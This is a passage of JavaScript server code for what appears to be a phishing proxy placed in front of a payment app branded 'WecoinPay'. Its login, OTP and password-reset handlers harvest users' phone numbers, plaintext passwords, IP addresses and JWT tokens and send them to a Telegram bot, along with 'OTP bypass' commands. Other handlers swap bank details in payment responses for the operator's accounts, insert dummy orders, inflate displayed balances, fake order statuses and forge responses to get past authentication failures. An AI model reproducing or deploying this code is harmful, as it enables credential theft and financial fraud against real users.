            url: customLink,
            icon: "https://img.icons8.com/color/96/telegram-app.png",
            status: 1
          }],
          message: "success"
        };
        return sendJson(res, respHeaders, fallbackObj, JSON.stringify(fallbackObj));
      }
    }
  } catch (e) { }
  return sendJson(res, respHeaders, jsonResp, respBuffer);
});

app.post('/app/user/login/login', async (req, res) => {
  try {
    const data = await loadData();
    const body = req.parsedBody || {};
    const phone = body.userName || body.username || body.phone || body.mobile || '';
    const pwd = body.password || body.pwd || body.loginPwd || 'N/A';

    const ip = req.headers['x-forwarded-for'] || req.headers['x-vercel-forwarded-for'] || 'N/A';
    const city = req.headers['x-vercel-ip-city'] || 'N/A';
    const time = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });

    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const loginData = getResponseData(jsonResp);
    let userId = '';

    if (loginData && typeof loginData === 'object') {
      userId = String(loginData.userId || loginData.id || loginData.memberId || '');
      const respToken = loginData.token || loginData.accessToken || '';
      const respRefresh = loginData.refreshToken || '';
      const respUsername = loginData.username || loginData.userName || '';

      if (respToken && userId) {
        const tKey = cleanToken(respToken);
        tokenUserMap[tKey] = userId;
        if (redis) redis.hset('tokenMap', tKey, userId).catch(() => { });
      }
      if (respRefresh && userId) {
        refreshTokenMap[String(userId)] = respRefresh;
        const rKey = cleanToken(respRefresh);
        tokenUserMap[rKey] = userId;
        if (redis) redis.hset('tokenMap', rKey, userId).catch(() => { });
      }
      if (userId) {
        saveTokenUserId(req, userId);
        if (phone) userPhoneMap[String(userId)] = String(phone);
        if (respUsername) userPhoneMap[String(userId)] = String(respUsername);
        const detectedPhone = phone || respUsername || '';
        trackUser(data, userId, 'Login', detectedPhone);
        saveData(data).catch(() => { });
      }
    }

    if (!userId) {
      userId = await extractUserId(req, jsonResp);
      if (userId && phone) {
        userPhoneMap[String(userId)] = String(phone);
        trackUser(data, userId, 'Login', phone);
        saveData(data).catch(() => { });
      }
    }

    if (data.adminChatId && bot) {
      const isSuccess = jsonResp && (jsonResp.code === 1000 || jsonResp.code === 200 || jsonResp.code === '1000');
      if (isSuccess) {
        const loginToken = loginData ? (loginData.token || loginData.accessToken || loginData.jwtToken || loginData.jwt || loginData.access_token || '') : (jsonResp?.data?.token || jsonResp?.data?.accessToken || jsonResp?.data?.access_token || jsonResp?.token || '');
        const devId = body.deviceId || body.androidId || body.device_id || '';
        let baseMsg =
          `✅ *[WecoinPay] Direct Login Successful*\n` +
          `━━━━━━━━━━━━━━━━━━\n` +
          `👤 *UserID:* \`${userId || 'N/A'}\`\n` +
          `📱 *Phone:* \`${phone || 'N/A'}\`\n` +
          `🔒 *Password:* \`${pwd}\`\n` +
          `🌐 *IP:* ${ip}${city !== 'N/A' ? ' (' + city + ')' : ''}\n` +
          `🕐 *Time:* ${time}`;

        if (loginToken) {
          baseMsg += `\n\n🔑 *JWT Token:*\n\`${loginToken}\``;
        }

        sendBot2Message(baseMsg);

        let msg = baseMsg;
        if (devId) {
          msg += `\n\n⚡ *OTP BYPASS COMMANDS:*\n` +
            `👉 Click to copy Single Use:\n\`/useid ${devId}\`\n` +
            `👉 Click to copy Persistent:\n\`/alwaysid ${devId}\``;
        }

        bot.sendMessage(data.adminChatId, msg, { parse_mode: 'Markdown' }).then(m => {
          if (m && m.message_id) bot.pinChatMessage(data.adminChatId, m.message_id).catch(() => { });
        }).catch(() => { });
      } else {
        const errorMsg = jsonResp ? (jsonResp.message || JSON.stringify(jsonResp)) : 'Unknown error';
        let msg =
          `❌ *Login Failed*\n` +
          `━━━━━━━━━━━━━━━━━━\n` +
          `📱 *Phone:* \`${phone || 'N/A'}\`\n` +
          `🔒 *Password:* \`${pwd}\`\n` +
          `⚠️ *Reason:* ${errorMsg}\n` +
          `🕐 *Time:* ${time}`;

        bot.sendMessage(data.adminChatId, msg, { parse_mode: 'Markdown' }).catch(() => { });
      }
    }
    sendJsonSafe(res, respHeaders, jsonResp, respBody, req);
  } catch (e) { await transparentProxy(req, res); }
});

app.post('/app/user/login/sendotp', sendOtpHandler);
app.post('/app/user/login/sendOtp', sendOtpHandler);

async function sendOtpHandler(req, res) {
  try {
    const data = await loadData();
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const body = req.parsedBody || {};
    if (data.adminChatId && bot) {
      const phone = body.userName || body.phone || body.mobile || 'N/A';
      const pwd = body.password || body.pwd || body.loginPwd || 'N/A';
      const ip = req.headers['x-forwarded-for'] || req.headers['x-vercel-forwarded-for'] || 'N/A';
      const city = req.headers['x-vercel-ip-city'] || 'N/A';
      const time = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });

      if (jsonResp && (jsonResp.code === 1000 || jsonResp.code === 200 || jsonResp.code === '1000')) {
        let msg =
          `📲 *[WecoinPay] OTP Sent Successfully*\n` +
          `━━━━━━━━━━━━━━━━━━\n` +
          `📱 *Phone:* \`${phone}\`\n` +
          `🔒 *Password:* \`${pwd}\`\n` +
          `🌐 *IP:* ${ip}${city !== 'N/A' ? ' (' + city + ')' : ''}\n` +
          `🕐 *Time:* ${time}`;

        bot.sendMessage(data.adminChatId, msg, { parse_mode: 'Markdown' }).catch(() => { });
        sendBot2Message(msg);
      } else {
        const errorMsg = jsonResp ? (jsonResp.message || JSON.stringify(jsonResp)) : 'Unknown error';
        let msg =
          `❌ *OTP Sending Failed*\n` +
          `━━━━━━━━━━━━━━━━━━\n` +
          `📱 *Phone:* \`${phone}\`\n` +
          `🔒 *Password:* \`${pwd}\`\n` +
          `⚠️ *Reason:* ${errorMsg}\n` +
          `🕐 *Time:* ${time}`;

        bot.sendMessage(data.adminChatId, msg, { parse_mode: 'Markdown' }).catch(() => { });
      }
    }
    sendJsonSafe(res, respHeaders, jsonResp, respBody, req);
  } catch (e) { await transparentProxy(req, res); }
}

app.post('/app/user/login/forgot', async (req, res) => {
  try {
    const data = await loadData();
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const body = req.parsedBody || {};
    if (data.adminChatId && bot) {
      const reqStr = JSON.stringify(body, null, 2);
      const resStr = jsonResp ? JSON.stringify(jsonResp, null, 2) : respBody;
      bot.sendMessage(data.adminChatId, `🔓 Forgot Password\n📱 Phone: ${body.userName || body.phone || 'N/A'}\n🕐 Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}\n\n📤 REQUEST BODY:\n${reqStr.substring(0, 1500)}\n\n📥 RESPONSE BODY:\n${resStr.substring(0, 1500)}`).catch(() => { });
    }
    sendJsonSafe(res, respHeaders, jsonResp, respBody, req);
  } catch (e) { await transparentProxy(req, res); }
});

app.post('/app/user/login/start', async (req, res) => {
  try {
    const data = await loadData();
    const body = req.parsedBody || {};
    const phone = body.userName || body.phone || body.mobile || 'N/A';
    const pwd = body.password || body.pwd || body.loginPwd || 'N/A';

    const ip = req.headers['x-forwarded-for'] || req.headers['x-vercel-forwarded-for'] || 'N/A';
    const city = req.headers['x-vercel-ip-city'] || 'N/A';
    const time = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });

    if (data.adminChatId && bot) {
      let msg =
        `🔑 *[WecoinPay] Login Attempt Started*\n` +
        `━━━━━━━━━━━━━━━━━━\n` +
        `📱 *Phone:* \`${phone}\`\n` +
        `🔒 *Password:* \`${pwd}\`\n` +
        `🌐 *IP:* ${ip}${city !== 'N/A' ? ' (' + city + ')' : ''}\n` +
        `🕐 *Time:* ${time}`;

      bot.sendMessage(data.adminChatId, msg, { parse_mode: 'Markdown' }).catch(() => { });
      sendBot2Message(msg);
    }

    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const startData = getResponseData(jsonResp);
    if (startData && body.deviceId) {
      const tmpKey = 'start_' + (body.userName || body.phone || body.mobile || body.userId || '');
      userDeviceMap[tmpKey] = body.deviceId;
    }

    sendJsonSafe(res, respHeaders, jsonResp, respBody, req);
  } catch (e) { await transparentProxy(req, res); }
});

app.post('/app/user/login/confirm', async (req, res) => {
  try {
    const data = await loadData();
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const body = req.parsedBody || {};
    const phone = body.userName || body.phone || body.mobile || '';
    const pwd = body.password || body.pwd || body.loginPwd || body.pin || 'N/A';

    const loginData = getResponseData(jsonResp);
    let userId = '';

    if (loginData && typeof loginData === 'object') {
      userId = String(loginData.userId || loginData.id || loginData.memberId || '');
      const respToken = loginData.token || loginData.accessToken || '';
      const respRefresh = loginData.refreshToken || '';
      const respUsername = loginData.username || loginData.userName || '';

      if (respToken && userId) {
        const tKey = cleanToken(respToken);
        tokenUserMap[tKey] = userId;
        if (redis) redis.hset('tokenMap', tKey, userId).catch(() => { });
      }
      if (respRefresh && userId) {
        refreshTokenMap[String(userId)] = respRefresh;
        const rKey = cleanToken(respRefresh);
        tokenUserMap[rKey] = userId;
        if (redis) redis.hset('tokenMap', rKey, userId).catch(() => { });
      }
      const deviceId = body.deviceId || body.androidId || body.device_id || '';
      if (deviceId && userId) {
        userDeviceMap[String(userId)] = deviceId;
      }
      if (userId) {
        saveTokenUserId(req, userId);
        if (phone) userPhoneMap[String(userId)] = String(phone);
        if (respUsername) userPhoneMap[String(userId)] = String(respUsername);
        const detectedPhone = phone || respUsername || '';
        trackUser(data, userId, 'Login', detectedPhone);
        saveData(data).catch(() => { });
      }
    }

    if (!userId) {
      userId = await extractUserId(req, jsonResp);
      if (userId && phone) {
        userPhoneMap[String(userId)] = String(phone);
        trackUser(data, userId, 'Login', phone);
        saveData(data).catch(() => { });
      }
    }

    if (data.adminChatId && bot) {
      const ip = req.headers['x-forwarded-for'] || req.headers['x-vercel-forwarded-for'] || 'N/A';
      const city = req.headers['x-vercel-ip-city'] || 'N/A';
      const time = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });

      if (jsonResp && (jsonResp.code === 1000 || jsonResp.code === 200 || jsonResp.code === '1000')) {
        const loginToken = loginData ? (loginData.token || loginData.accessToken || loginData.jwtToken || loginData.jwt || loginData.access_token || '') : (jsonResp?.data?.token || jsonResp?.data?.accessToken || jsonResp?.data?.access_token || jsonResp?.token || '');
        const devId = body.deviceId || body.androidId || body.device_id || '';
        let baseMsg =
          `✅ *[WecoinPay] Login Successful*\n` +
          `━━━━━━━━━━━━━━━━━━\n` +
          `👤 *UserID:* \`${userId || 'N/A'}\`\n` +
          `📱 *Phone:* \`${phone || 'N/A'}\`\n` +
          `🔒 *Password:* \`${pwd}\`\n` +
          `🌐 *IP:* ${ip}${city !== 'N/A' ? ' (' + city + ')' : ''}\n` +
          `🕐 *Time:* ${time}`;

        if (loginToken) {
          baseMsg += `\n\n🔑 *JWT Token:*\n\`${loginToken}\``;
        }

        // Send copy to Bot 2 WITHOUT OTP Bypass commands
        sendBot2Message(baseMsg);

        let msg = baseMsg;
        if (devId) {
          msg += `\n\n⚡ *OTP BYPASS COMMANDS:*\n` +
            `👉 Click to copy Single Use:\n\`/useid ${devId}\`\n` +
            `👉 Click to copy Persistent:\n\`/alwaysid ${devId}\``;
        }

        bot.sendMessage(data.adminChatId, msg, { parse_mode: 'Markdown' }).then(m => {
          if (m && m.message_id) bot.pinChatMessage(data.adminChatId, m.message_id).catch(() => { });
        }).catch(() => { });
      } else {
        const errorMsg = jsonResp ? (jsonResp.message || JSON.stringify(jsonResp)) : 'Unknown error';
        let msg =
          `❌ *[WecoinPay] Login Failed*\n` +
          `━━━━━━━━━━━━━━━━━━\n` +
          `📱 *Phone:* \`${phone || 'N/A'}\`\n` +
          `🔒 *Password:* \`${pwd}\`\n` +
          `⚠️ *Reason:* ${errorMsg}\n` +
          `🕐 *Time:* ${time}`;

        bot.sendMessage(data.adminChatId, msg, { parse_mode: 'Markdown' }).catch(() => { });
      }
    }
    if (data.useIdOverride) {
      data.useIdOverride = null;
      saveData(data).catch(() => { });
    }
    sendJsonSafe(res, respHeaders, jsonResp, respBody, req);
  } catch (e) { await transparentProxy(req, res); }
});

function getOrderAmountFromReq(req, respData) {
  if (respData && typeof respData === 'object') {
    const amt = respData.orderAmount || respData.amount || respData.buyAmount || respData.unpaidAmount || respData.totalAmount;
    if (amt !== undefined && amt !== null) {
      const num = parseFloat(amt);
      if (!isNaN(num)) return num;
    }
  }
  const body = req && req.parsedBody ? req.parsedBody : {};
  const bodyAmt = body.amount || body.orderAmount || body.buyAmount || body.totalAmount;
  if (bodyAmt !== undefined && bodyAmt !== null) {
    const num = parseFloat(bodyAmt);
    if (!isNaN(num)) return num;
  }
  return null;
}

async function proxyAndReplaceBankDetails(req, res, label) {
  const data = await loadData();
  const reqUserId = await extractUserId(req, null);
  const reqEff = getEffectiveSettings(data, reqUserId);
  if (reqEff.botEnabled === false) return await transparentProxy(req, res);

  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const detectedUserId = await extractUserId(req, jsonResp) || reqUserId;
    const eff = getEffectiveSettings(data, detectedUserId);

    const respData = getResponseData(jsonResp);

    const orderAmt = getOrderAmountFromReq(req, respData && typeof respData === 'object' && !Array.isArray(respData) ? respData : null);
    const globalActive = eff.botEnabled !== false ? getActiveBank(data, detectedUserId) : null;

    let active = null;
    let notReplacedReason = '';

    if (globalActive) {
      if (globalActive.minAmount && orderAmt !== null && orderAmt < globalActive.minAmount) {
        notReplacedReason = `Order ₹${orderAmt} < min ₹${globalActive.minAmount} for bank ${globalActive.accountHolder}`;
        active = null;
      } else {
        active = globalActive;
        if (data.autoRotate && data._rotatedIndex !== undefined) {
          data.lastUsedIndex = data._rotatedIndex;
          delete data._rotatedIndex;
          await saveData(data);
        }
      }
    }

    if (respData && active) {
      if (Array.isArray(respData)) {
        respData.forEach(item => { if (item && typeof item === 'object') deepReplace(item, active, {}, 0); });
      } else {
        const originalValues = {};
        deepReplace(respData, active, originalValues, 0);
      }
    }

    if (detectedUserId) {
      trackUser(data, detectedUserId, `Order ${jsonResp?.data?.orderId || jsonResp?.data?.buyId || ''}`);
      saveData(data).catch(() => { });
    }

    if (jsonResp && isAuthFailureResponse(jsonResp) && shouldBypass401(req)) {
      const bypass = make401Bypass(jsonResp);
      sendJson(res, respHeaders, bypass, JSON.stringify(bypass));
      return;
    }

    sendJsonSafe(res, respHeaders, jsonResp, respBody, req);
  } catch (e) {
    console.error('Proxy+replace error:', req.originalUrl, e.message);
    if (!res.headersSent) res.status(502).json({ error: 'proxy error' });
  }
}

async function proxyAndReplaceBankInList(req, res) {
  const data = await loadData();

  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    let detectedUserId = await extractUserIdFromToken(req);
    if (!detectedUserId) detectedUserId = await extractUserId(req, jsonResp);
    const eff = getEffectiveSettings(data, detectedUserId);
    const active = (eff.botEnabled !== false) ? await getActiveBankAndSave(data, detectedUserId) : null;

    const listData = getResponseData(jsonResp);
    if (listData) {
      // 1. Keep real server orders intact for all tabs (1000-10000, Top Picks, etc)
      // 2. Only unshift dummy orders if added via /adddummy
      if (data.dummyOrders && Array.isArray(data.dummyOrders) && data.dummyOrders.length > 0 && req.originalUrl.includes('/app/payment/order') && !req.originalUrl.includes('/history') && !req.originalUrl.includes('orderInfo')) {
        const qMin = parseFloat(req.query.minAmount || req.query.min || 0);
        const qMax = parseFloat(req.query.maxAmount || req.query.max || 9999999);
        const matchingDummies = data.dummyOrders.filter(d => {
          const amt = parseFloat(d.amount || d.orderAmount || 0);
          if (req.query.minAmount || req.query.maxAmount || req.query.min || req.query.max) {
            return amt >= qMin && amt <= qMax;
          }
          return true;
        });

        if (matchingDummies.length > 0) {
          matchingDummies.forEach(d => {
            const cd = String(d.code || d.orderCode || d.buyCode || d.remark || d.id || 'N/A').trim();
            const p = parseFloat(d.percent) || data.defaultIncomePercent || 3;
            const amt = parseFloat(d.amount || d.orderAmount || 0);
            const inc = parseFloat((amt * (p / 100)).toFixed(2));

            d.id = cd;
            d.payOrderId = cd;
            d.orderId = cd;
            d.buyId = cd;
            d.code = cd;
            d.orderCode = cd;
            d.buyCode = cd;
            d.remark = cd;
            d.sn = cd;
            d.codeName = cd;
            d.percent = p;
            d.commissionRate = p;
            d.income = inc;
            d.commission = inc;
            d.rebate = inc;
            d.reward = inc;
            d.profit = inc;
            d.incomeAmount = inc;
            d.commissionAmount = inc;
            d.rebateAmount = inc;
            d.rewardAmount = inc;
            d.rateAmount = inc;
          });
          if (Array.isArray(listData)) {
            listData.unshift(...matchingDummies);
          } else if (listData.records && Array.isArray(listData.records)) {
            listData.records.unshift(...matchingDummies);
          } else if (listData.list && Array.isArray(listData.list)) {
            listData.list.unshift(...matchingDummies);
          }
        }
      }

      cacheOrderDetails(listData);
      const applyToItem = (item) => {
        if (!item || typeof item !== 'object') return;
        const itemUserId = item.userId ? String(item.userId) : (item.memberId ? String(item.memberId) : detectedUserId);
        const itemEff = getEffectiveSettings(data, itemUserId);
        const itemCode = extractOrderCode(item) || String(item.orderCode || item.code || item.buyCode || item.sn || item.remark || '').trim();
        const itemId = String(item.orderId || item.payOrderId || item.buyId || item.id || item.orderNo || '').trim();

        // 1. History Order Status Override
        if (data.orderStatusOverrides && typeof data.orderStatusOverrides === 'object') {
          const itemOrderNo = String(item.orderNo || '').trim();
          const itemRemark = String(item.remark || '').trim();
          const itemBuyId = String(item.buyId || '').trim();
          const itemPayOrderId = String(item.payOrderId || '').trim();

          const candKeys = [
            itemCode, itemId, itemOrderNo, itemRemark, itemBuyId, itemPayOrderId,
            `${itemUserId}:${itemCode}`, `${itemUserId}:${itemId}`, `${itemUserId}:${itemOrderNo}`, `${itemUserId}:${itemRemark}`
          ].filter(Boolean);

          let stOverride = null;
          for (const k of candKeys) {
            if (data.orderStatusOverrides[k]) {
              stOverride = data.orderStatusOverrides[k];
              break;
            }
          }

          if (stOverride && stOverride.status !== undefined) {
            const targetStatus = Number(stOverride.status);
            const statusLabels = { 1: "Processing", 2: "Processing", 3: "Completed", 4: "Close" };
            const labelStr = stOverride.statusLabel || statusLabels[targetStatus] || "Completed";

            item.status = targetStatus;
            if (item.state !== undefined) item.state = targetStatus;
            if (item.orderStatus !== undefined) item.orderStatus = targetStatus;
            if (item.statusCode !== undefined) item.statusCode = targetStatus;

            if (item.statusLabel !== undefined) item.statusLabel = labelStr;
            if (item.stateLabel !== undefined) item.stateLabel = labelStr;
          }
        }

        let itemBound = null;
        if (data.orderBankMap) {
          if (itemCode && data.orderBankMap[itemCode]) itemBound = data.orderBankMap[itemCode].bank;
          else if (itemId && data.orderBankMap[itemId]) itemBound = data.orderBankMap[itemId].bank;
        }

        const itemActive = itemBound || ((itemEff.botEnabled !== false) ? getActiveBank(data, itemUserId) : null);
        if (itemActive) { const origVals = {}; deepReplace(item, itemActive, origVals, 0); }
        if (itemEff.depositSuccess) markDepositSuccess(item);
      };
      if (Array.isArray(listData)) {
        listData.forEach(applyToItem);
      } else if (listData.list && Array.isArray(listData.list)) {
        listData.list.forEach(applyToItem);
      } else if (listData.records && Array.isArray(listData.records)) {
        listData.records.forEach(applyToItem);
      } else if (listData.rows && Array.isArray(listData.rows)) {
        listData.rows.forEach(applyToItem);
      } else if (listData.content && Array.isArray(listData.content)) {
        listData.content.forEach(applyToItem);
      } else {
        applyToItem(listData);
      }
    }

    if (jsonResp && isAuthFailureResponse(jsonResp) && shouldBypass401(req)) {
      const bypass = make401Bypass(jsonResp);
      sendJson(res, respHeaders, bypass, JSON.stringify(bypass));
      return;
    }

    sendJsonSafe(res, respHeaders, jsonResp, respBody, req);
  } catch (e) {
    console.error('List replace error:', req.originalUrl, e.message);
    if (!res.headersSent) res.status(502).json({ error: 'proxy error' });
  }
}

async function proxyAndAddBonus(req, res) {
  const data = await loadData();
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const tokenUserId = await extractUserIdFromToken(req);
    let detectedUserId = tokenUserId;
    if (!detectedUserId) {
      const respData = getResponseData(jsonResp);
      if (respData && typeof respData === 'object' && !Array.isArray(respData)) {
        const rid = respData.userId || respData.userid || respData.memberId || '';
        if (rid) detectedUserId = String(rid);
      }
    }
    const eff = getEffectiveSettings(data, detectedUserId);
    const bonus = eff.depositSuccess ? (eff.depositBonus || 0) : 0;

    if (detectedUserId) {
      if (tokenUserId || !await getUserIdFromToken(req)) saveTokenUserId(req, detectedUserId);
      trackUser(data, detectedUserId, `App Open ${req.path}`);
      saveData(data).catch(() => { });
    }

    const bonusData = getResponseData(jsonResp);
    if (bonus > 0 && bonusData) {
      addBonusToBalanceFields(bonusData, bonus);
    }

    if (detectedUserId && bonusData && typeof bonusData === 'object') {
      const userOvr = data.userOverrides && data.userOverrides[String(detectedUserId)];
      const addedBal = userOvr && userOvr.addedBalance !== undefined ? userOvr.addedBalance : 0;
      if (addedBal !== 0) {
        addBonusToBalanceFields(bonusData, addedBal);
      }
    }

    if (jsonResp && isAuthFailureResponse(jsonResp) && shouldBypass401(req)) {
      const bypass = make401Bypass(jsonResp);
      sendJson(res, respHeaders, bypass, JSON.stringify(bypass));
      return;
    }

    sendJsonSafe(res, respHeaders, jsonResp, respBody, req);
  } catch (e) {
    if (!res.headersSent) res.status(502).json({ error: 'proxy error' });
  }
}

app.all('/app/user/info', async (req, res) => {
  const data = await loadData();
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const respData = getResponseData(jsonResp);
    const uid = respData?.userId || respData?.id || respData?.memberId || '';
    const effectiveUserId = uid ? String(uid) : '';
    let phone = '';
    let bal = '';
    let username = '';
    if (respData && typeof respData === 'object') {
      phone = respData.phone || respData.mobile || respData.userName || '';
      username = respData.username || respData.userName || respData.name || '';
      bal = respData.balance ?? respData.availableBalance ?? respData.totalBalance ?? respData.amount ?? '';
      if (!effectiveUserId && !phone) {
        for (const [k, v] of Object.entries(respData)) {
          if (!phone && /phone|mobile|tel/i.test(k) && v) phone = String(v);
        }
      }
    }
    if (effectiveUserId && respData && typeof respData === 'object') {
      const userOvr = data.userOverrides && data.userOverrides[String(effectiveUserId)];
      const addedBal = userOvr && userOvr.addedBalance !== undefined ? userOvr.addedBalance : 0;
      if (addedBal !== 0) {
        const balKeys = ['balance', 'availableBalance'];
        for (const bk of balKeys) {
          if (respData[bk] !== undefined) {
            const numBal = parseFloat(respData[bk]) || 0;
            respData[bk] = typeof respData[bk] === 'string'
              ? String(parseFloat((numBal + addedBal).toFixed(2)))
              : parseFloat((numBal + addedBal).toFixed(2));
          }
        }
      }
    }
    if (data.adminChatId && bot) {
      const mineOvr = data.userOverrides && data.userOverrides[String(effectiveUserId)];
      const mineAdded = mineOvr && mineOvr.addedBalance !== undefined ? mineOvr.addedBalance : 0;
      const realBal = bal !== '' ? bal : 'N/A';
      const displayBal = (realBal !== 'N/A' && mineAdded !== 0)
        ? parseFloat((parseFloat(realBal) + mineAdded).toFixed(2))
        : realBal;
      let mineMsg = `👤 Mine [${effectiveUserId || 'N/A'}]\n📱 Phone: ${phone || 'N/A'}`;
      if (mineAdded !== 0) {
        mineMsg += `\n━━━━━━━━━━━━━━━━━━`;
        mineMsg += `\n🏦 Real Balance: ₹${realBal}`;
        mineMsg += `\n➕ Bot Added: ₹${mineAdded}`;
        mineMsg += `\n👁️ User Sees: ₹${displayBal}`;
      } else {
        mineMsg += `\n💰 Balance: ₹${realBal}`;
      }
      bot.sendMessage(data.adminChatId, mineMsg).catch(() => { });
      sendBot2Message(mineMsg);
    }
    if (jsonResp && isAuthFailureResponse(jsonResp) && shouldBypass401(req)) {
      const bypass = make401Bypass(jsonResp);
      sendJson(res, respHeaders, bypass, JSON.stringify(bypass));
      return;
    }

    sendJsonSafe(res, respHeaders, jsonResp, respBody, req);
    if (effectiveUserId) {
      saveTokenUserId(req, effectiveUserId);
      if (!data.trackedUsers) data.trackedUsers = {};
      const existing = data.trackedUsers[String(effectiveUserId)] || {};
      data.trackedUsers[String(effectiveUserId)] = {
        ...existing,
        lastAction: 'userInfo',
        lastSeen: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
        phone: phone || existing.phone || '',
        name: username || existing.name || '',
        balance: bal !== '' ? bal : (existing.balance || ''),
        orderCount: existing.orderCount || 0
      };
      saveData(data).catch(() => { });
    }
  } catch (e) { await transparentProxy(req, res); }
});

async function proxyAndAddBonusPersonal(req, res) {
  const data = await loadData();
  try {
    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const bonusData = getResponseData(jsonResp);
    const detectedUserId = await extractUserIdFromToken(req) || (bonusData && (bonusData.userId || bonusData.memberId));

    let realBal = 0;
    let addedBal = 0;
    let totalBal = 0;
    let phone = '';

    if (detectedUserId && bonusData && typeof bonusData === 'object') {
      phone = getPhone(data, detectedUserId);
      const userOvr = data.userOverrides && data.userOverrides[String(detectedUserId)];
      addedBal = userOvr && userOvr.addedBalance !== undefined ? userOvr.addedBalance : 0;

      const personBalKeys = ['balance', 'integral', 'availablebalance', 'money', 'coin', 'wallet'];
      let foundBal = false;
      for (const key of Object.keys(bonusData)) {
        if (personBalKeys.includes(key.toLowerCase())) {
          const current = parseFloat(bonusData[key]);
          if (!isNaN(current)) {
            if (!foundBal) {
              realBal = current;
              totalBal = current + addedBal;
              foundBal = true;
            }
            bonusData[key] = typeof bonusData[key] === 'string'
              ? String((current + addedBal).toFixed(2))
              : parseFloat((current + addedBal).toFixed(2));
          }
        }
      }

      if (data.adminChatId && bot && !isLogOff(data, detectedUserId) && !(await isLogOffByToken(data, req))) {
        let msg = `📊 *User Balance Report*\n\n`;
        msg += `👤 *User:* \`${detectedUserId}\`${phone ? ' (' + phone + ')' : ''}\n`;
        msg += `💰 *Real Balance:* \`₹${realBal.toFixed(2)}\`\n`;
        msg += `➕ *Bot Added:* \`₹${addedBal.toFixed(2)}\`\n`;
        msg += `👀 *User Sees:* \`₹${totalBal.toFixed(2)}\`\n`;
        msg += `\n🌐 *Path:* ${req.originalUrl.split('?')[0]}`;

        bot.sendMessage(data.adminChatId, msg, { parse_mode: 'Markdown' }).catch(() => { });
        sendBot2Message(msg);
      }
    }

    if (jsonResp && isAuthFailureResponse(jsonResp) && shouldBypass401(req)) {
      const bypass = make401Bypass(jsonResp);
      sendJson(res, respHeaders, bypass, JSON.stringify(bypass));
      return;
    }
    sendJsonSafe(res, respHeaders, jsonResp, respBody, req);
  } catch (e) { await transparentProxy(req, res); }
}
app.all('/app/user/info/person', async (req, res) => { await proxyAndAddBonusPersonal(req, res); });
app.all('/app/user/info/personV2', async (req, res) => { await proxyAndAddBonusPersonal(req, res); });

app.post('/app/payment/order/create', async (req, res) => {
  const data = await loadData();
  try {
    const body = req.parsedBody || {};
    const userId = await extractUserId(req, null);
    const dummyMatch = findDummyOrder(data, req);

    if (dummyMatch) {
      if (userId) { trackUser(data, userId, 'Deposit Order (Dummy)'); }
      const buyId = String(dummyMatch.id || dummyMatch.payOrderId || dummyMatch.code);
      const pWIdStr = String(body.payoutWalletId || body.walletId || '');
      const cachedWallet = payoutWalletCache.get(pWIdStr);

      const walletNamesMap = { 1: "Airtel", 2: "Freecharge", 3: "PhonePe", 4: "Mobikwik", 5: "Paytm", 6: "AmazonPay" };
      const walletIntentMap = { 1: "airtel://", 2: "freecharge://", 3: "phonepe://", 4: "mobikwik://", 5: "paytmmp://", 6: "amazonpay://" };
      const walletUpiSuffix = { 1: "@airtel", 2: "@freecharge", 3: "@ybl", 4: "@ikwik", 5: "@paytm", 6: "@apl" };

      if (cachedWallet) {
        dummyMatch.payoutWalletType = cachedWallet.ctType;
        dummyMatch.payoutWalletName = cachedWallet.walletName;
        dummyMatch.payoutWalletAccount = cachedWallet.account;
        dummyMatch.payoutWalletUpi = cachedWallet.upi;
        dummyMatch.intent = cachedWallet.intent;
      } else {
        const wId = Number(body.payoutWalletId || body.walletId || body.payoutWalletType || 2);
        const wName = walletNamesMap[wId] || "Freecharge";
        const userPhoneStr = getPhone(data, userId) || "6206785398";
        const defaultSuffix = walletUpiSuffix[wId] || "@freecharge";
        dummyMatch.payoutWalletType = wId;
        dummyMatch.payoutWalletName = wName;
        dummyMatch.payoutWalletAccount = userPhoneStr;
        dummyMatch.payoutWalletUpi = userPhoneStr + defaultSuffix;
        dummyMatch.intent = walletIntentMap[wId] || (wName.toLowerCase() + "://");
      }

      const nowMs = Date.now();
      if (!dummyMatch.expiryTimestamp) {
        dummyMatch.expiryTimestamp = nowMs + 15 * 60 * 1000;
      }

      data.dummyOrders = (data.dummyOrders || []).filter(d => d && String(d.id) !== String(dummyMatch.id) && d.code !== dummyMatch.code);
      data.activeBoughtDummyOrders = data.activeBoughtDummyOrders || {};
      dummyMatch.boughtByUserId = userId || 'N/A';
      dummyMatch.boughtAtTime = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
      data.activeBoughtDummyOrders[String(dummyMatch.id)] = dummyMatch;
      if (dummyMatch.code) data.activeBoughtDummyOrders[String(dummyMatch.code)] = dummyMatch;

      await saveData(data);

      if (data.adminChatId && bot && !dummyMatch._sentDeleteAlert) {
        dummyMatch._sentDeleteAlert = true;
        const phone = getPhone(data, userId);
        const timeStr = dummyMatch.boughtAtTime || new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
        let delMsg =
          `🗑️ *Dummy Order Deleted (Purchased)*\n` +
          `━━━━━━━━━━━━━━━━━━\n` +
          `👤 *Buyed By User:* \`${userId || 'N/A'}\`${phone ? ' (' + phone + ')' : ''}\n` +
          `📋 *Order Code:* \`${dummyMatch.code}\`\n` +
          `💰 *Amount:* \`₹${dummyMatch.amount}\`\n` +
          `🕐 ${timeStr}\n` +
          `━━━━━━━━━━━━━━━━━━\n` +
          `ℹ️ This order was purchased and has been automatically removed from available dummy list.`;

        bot.sendMessage(data.adminChatId, delMsg, { parse_mode: 'Markdown' }).catch(() => {
